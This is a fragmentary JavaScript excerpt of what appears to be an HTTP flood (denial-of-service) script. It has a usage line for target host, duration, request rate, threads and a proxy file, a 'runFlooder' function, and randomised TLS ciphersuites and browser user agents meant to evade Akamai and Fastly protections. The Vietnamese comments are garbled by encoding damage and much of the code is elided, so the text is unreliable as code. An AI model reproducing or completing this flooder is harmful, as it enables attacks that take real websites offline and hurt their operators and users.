...
// S? d?ng hàm ð? l?y m?t ciphersuite ng?u nhiên và in ra k?t qu?
const randomTLSCiphersuite = getRandomTLSCiphersuite();
  const firefoxVersion = "119.0.1"; // ??t phiên b?n Firefox theo mong mu?n c?a b?n
...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt ok`); process.exit();}
 ...
 colors.enable();
const coloredString = "recommended big proxyfile if target is akamai/fastly".white;
 ...
 const parsedTarget = url.parse(args.target);
    console.clear()
    console.log("Test Script By : bot".rainbow);
...
function getRandomUserAgent() {
    ...
    const version = `${firefoxVersion}`; // Thay ð?i version n?u c?n
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version} (${os}; ${country}; ${language})`;
...
// S? d?ng hàm ð? l?y giá tr? sec-ch-ua
const secChUaValue = getRandomUserAgent();
...
colors.enable();
  ...
  function runFlooder() {
    ...
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
	  ...
	  process.stdout.write('l?i r?i ð?t m? mày\r');
	  interval = 1000;
	}
